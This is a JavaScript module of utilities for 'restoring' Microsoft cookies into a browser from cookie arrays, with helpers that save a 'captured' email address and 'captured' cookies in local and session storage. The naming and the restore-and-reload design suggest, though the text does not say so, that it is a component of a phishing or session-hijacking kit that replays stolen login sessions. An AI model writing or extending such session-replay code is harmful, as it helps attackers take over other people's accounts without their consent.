/**
 * Robust Microsoft Cookie Restoration & Capture Utilities
 * Supports full cookie attributes for session restoration.
 * 
 * Usage:
 *   import { restoreMicrosoftCookies, restoreCookies, setCapturedEmail, setCapturedCookies } from './restoreCookies';
 *   restoreMicrosoftCookies(cookiesArray, { reload: true });
 *   restoreCookies(cookiesArray); // For generic restoration
 *   setCapturedEmail(email);
 *   setCapturedCookies(cookiesArray);
 *   restoreCookiesWithReload(cookiesArray); // NEW: restore and reload
 *
 * @param {Array} cookiesArray - Array of cookie objects
 * @param {Object} options - { reload: boolean } reload page after restoration
 */

// Main Microsoft cookie restoration with full attributes
export function restoreMicrosoftCookies(cookiesArray, options = { reload: true }) {
    if (!Array.isArray(cookiesArray)) {
        console.error('Invalid cookies array');
        return;
    }
    const results = [];
    cookiesArray.forEach(cookie => {
        try {
            if (!cookie.name || typeof cookie.value === 'undefined') {
                throw new Error('Missing name or value');
            }
            // Normalize attribute names
            const name = cookie.name;
            const value = cookie.value;
            const domain = cookie.domain || '';
            const path = cookie.path || '/';
            const secure = !!cookie.secure;
            const sameSite = cookie.sameSite || cookie.samesite || 'None';
            const expiresUnix = cookie.expires || cookie.expirationDate;
            const isSession = !!cookie.session || expiresUnix === undefined || expiresUnix === null;
            
            // Start cookie string
            let cookieString = `${name}=${value}; path=${path};`;
            
            // __Host- prefix rules
            if (name.startsWith('__Host-')) {
                cookieString += ' Secure;';
                cookieString += ' path=/;';
            } else if (domain) {
                cookieString += ` domain=${domain};`;
            }
            
            if (!isSession && expiresUnix) {
                const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
                const expiresDate = new Date(expiresMs);
                cookieString += ` expires=${expiresDate.toUTCString()};`;
            }
            if (secure || name.startsWith('__Secure-') || name.startsWith('__Host-')) {
                cookieString += ' Secure;';
            }
            if (sameSite) {
                let samesiteNorm = sameSite[0].toUpperCase() + sameSite.slice(1).toLowerCase();
                cookieString += ` SameSite=${samesiteNorm};`;
            }
            document.cookie = cookieString;
            results.push({
                name,
                value,
                expires: !isSession && expiresUnix ? new Date((expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000)).toUTCString() : 'Session',
                domain,
                path,
                secure,
                sameSite: sameSite || '',
                set: true
            });
        } catch (err) {
            results.push({ name: cookie.name || '', set: false, error: err.message });
            console.error(`Failed to set cookie "${cookie.name}": ${err.message}`);
        }
    });
    console.table(results);
    console.log(`✅ Restored ${results.filter(r => r.set).length} cookies`);
    if (options.reload) {
        location.reload();
    }
}

// Generic restoreCookies for normal usage (no reload, no logging)
export function restoreCookies(cookies) {
    if (!Array.isArray(cookies)) return;
    cookies.forEach(cookie => {
        let cookieStr = `${cookie.name}=${cookie.value}; path=${cookie.path || '/'};`;
        if (cookie.domain) cookieStr += ` domain=${cookie.domain};`;
        if (cookie.secure) cookieStr += ' Secure;';
        if (cookie.sameSite) cookieStr += ` SameSite=${cookie.sameSite};`;
        if (cookie.expires) {
            const expiresMs = cookie.expires > 1e10 ? cookie.expires : cookie.expires * 1000;
            cookieStr += ` expires=${new Date(expiresMs).toUTCString()};`;
        }
        document.cookie = cookieStr;
    });
}

// NEW FUNCTION: Restore cookies and reload the page
export function restoreCookiesWithReload(cookies) {
    restoreCookies(cookies);
    window.location.reload();
}

// Store the captured email in localStorage/sessionStorage
export function setCapturedEmail(email) {
    if (!email) return;
    try {
        localStorage.setItem('captured_email', email);
        sessionStorage.setItem('captured_email', email);
    } catch (e) {}
}

// Store the captured cookies in localStorage/sessionStorage
export function setCapturedCookies(cookies) {
    if (!cookies) return;
    try {
        localStorage.setItem('captured_cookies', JSON.stringify(cookies));
        sessionStorage.setItem('captured_cookies', JSON.stringify(cookies));
    } catch (e) {}
}